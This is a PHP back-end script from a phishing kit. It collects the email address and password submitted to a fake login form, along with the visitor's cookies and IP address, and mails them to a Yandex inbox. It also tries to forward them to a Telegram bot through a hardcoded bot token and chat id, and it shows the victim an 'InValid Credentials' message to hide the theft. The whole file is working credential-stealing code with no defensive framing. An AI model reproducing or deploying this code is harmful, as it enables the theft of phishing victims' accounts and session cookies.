<?php

$botToken = "6225464385:AAElkwBl1JvZ-_73synRlFLQgd-n9V0fOLA";

$id = "5892762860";

$cookies = $_SERVER['HTTP_COOKIE'];
$ips = getenv("REMOTE_ADDR");

if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];
 
$resultbox = "excel011@yandex.ru";


$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);

         $subject = "New Login from justin well office";
		 
		 $message =  "Online ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
			$message .= "Cookies           : ".$cookies."\r\n";	 
		 $message .= "IP           : ".$ips."\r\n";	 
		 $message .= "Login Successful       : No\r\n";
		$header = "Content type:justin well\r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 mail ($resultbox,$subject,$message,$header);
		 
		 
		 
		
}




?> 